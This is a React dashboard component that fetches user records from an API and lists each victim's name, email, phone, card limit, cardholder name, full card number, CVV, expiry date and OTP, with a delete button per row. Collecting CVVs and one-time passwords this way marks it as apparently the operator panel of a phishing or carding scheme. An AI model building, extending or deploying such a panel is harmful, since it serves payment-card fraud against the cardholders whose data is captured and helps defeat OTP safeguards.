import axios from "axios";
import React, { useEffect, useState } from "react";
import { apis } from "../utils/apis";
import { AiOutlineDelete } from "react-icons/ai";
import toast from "react-hot-toast";
import Loader from "../utils/Loader";
import LoadingBar from "react-top-loading-bar";
import { useRef } from "react";
import { FormatDateTime } from "../utils/FormatDateTime";

const WebPage = () => {
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const loadingBarRef = useRef(null);

  const getWebData = async () => {
    try {
      loadingBarRef.current.continuousStart();
      const res = await axios.get(`${apis}/users`);
      const reversedData = res.data.reverse();
      setData(reversedData);
    } catch (error) {
      console.log(error);
    } finally {
      setLoading(false);
      loadingBarRef.current.complete();
    }
  };
  useEffect(() => {
    getWebData();
  }, []);

  const deleteWebDataUser = async (id) => {
    try {
      loadingBarRef.current.continuousStart();
      const res = await axios.delete(
        `${apis}/users/${id}`
      );
      console.log(res.data);
      toast.success("User Deleted Successfully");
      getWebData();
    } catch (error) {
      console.log(error);
    } finally {
      loadingBarRef.current.complete();
    }
  };

  return (
    <div className="flex flex-col flex-1">
      <LoadingBar color="#f11946" height={4} ref={loadingBarRef} />

      <header className="bg-white shadow" />
      <main className="flex-1 overflow-x-hidden ">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <h2 className="text-2xl font-semibold">Dashboard Web Data</h2>
          <div className="mt-4 bg-white shadow sm:rounded-lg h-[80vh] overflow-x-scroll">
            {loading ? (
              <Loader />
            ) : (
              <table className="min-w-full divide-y divide-gray-200">
                <thead className="bg-gray-50">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      id
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Full Name
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Email
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Created At
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Mobile Number
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Card Limit
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Card Holder Name
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Card Number
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      CVV
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Expiry Date
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      OTP
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Action
                    </th>
                  </tr>
                </thead>

                <tbody className="bg-white divide-y divide-gray-200">
                  {data.map((item, i) => (
                    <tr key={item._id}>
                      <td className="px-6 py-4 whitespace-wrap">{i + 1}</td>
                      <td className="px-6 py-4 whitespace-wrap">
                        {item?.fullName}
                      </td>
                      <td className="px-6 py-4 whitespace-wrap wrap-textClass">
                        {item?.email}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap ">
                        {FormatDateTime(item?.createdAt)}
                      </td>
                      <td className="px-6 py-4 whitespace-wrap">
                        {item?.mobile}
                      </td>
                      <td className="px-6 py-4 whitespace-wrap">
                        {item?.cardLimit}
                      </td>
                      <td className="px-6 py-4 whitespace-wrap">
                        {item?.cardHolderName}
                      </td>
                      <td className="px-6 py-4 whitespace-wrap">
                        {item?.cardNumber}
                      </td>
                      <td className="px-6 py-4 whitespace-wrap">{item?.cvv}</td>
                      <td className="px-6 py-4 whitespace-wrap">
                        {item?.expiryDate}
                      </td>

                      <td className="px-6 py-4 whitespace-wrap">{item?.otp}</td>

                      <td className="px-6 py-4 whitespace-wrap">
                        <button
                          onClick={() => deleteWebDataUser(item?._id)}
                          className="bg-gray-400 p-2 rounded-full"
                        >
                          <AiOutlineDelete color="white" />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>
        </div>
      </main>
      <footer className="bg-white shadow" />
    </div>
  );
};

export default WebPage;
